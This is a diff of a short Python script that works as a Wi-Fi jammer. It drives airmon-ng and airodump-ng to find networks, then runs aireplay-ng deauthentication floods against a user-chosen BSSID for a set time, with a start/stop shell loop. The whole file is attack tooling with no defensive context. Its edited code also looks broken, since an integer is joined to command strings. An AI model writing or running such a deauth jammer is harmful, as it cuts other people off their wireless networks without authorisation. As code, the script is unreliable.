@@ -1,4 +1,5 @@
 import os
+from threading import Timer
 
 
 os.system("iwconfig")
@@ -15,19 +16,27 @@ def monitormode():
     code1= "airodump-ng "+adapter+"mon"
     os.system(mmd)
     os.system(code1)
-
-def jam():
     bssid= input("( BSSID ) : ")
-    attack= input("( Requests ) : ")
+    secon= int(input("( time in sec. ) : "))
+    attack = secon*6
 
     code1="aireplay-ng --deauth "+attack+" -a "+bssid+" "+adapter+"mon"
     os.system(code1)
 
+def help():
+    print("")
+    print("1. start                     To Start the script")
+    print("2. stop                      To Stop Script ")
 
-bash = input ("( Shell ) : ")
+while True :
+    bash = input ("( Shell ) : ")
 
-if bash == "scan" :
-    monitormode()
+    if bash == "start" :
+        monitormode()
 
-if bash == "jam" :
-    jam()
+    if bash =="stop" :
+        coder= "airmon-ng stop "+adapter+"mon"
+        os.system(coder)
+
+    if bash == "help" :
+        help()
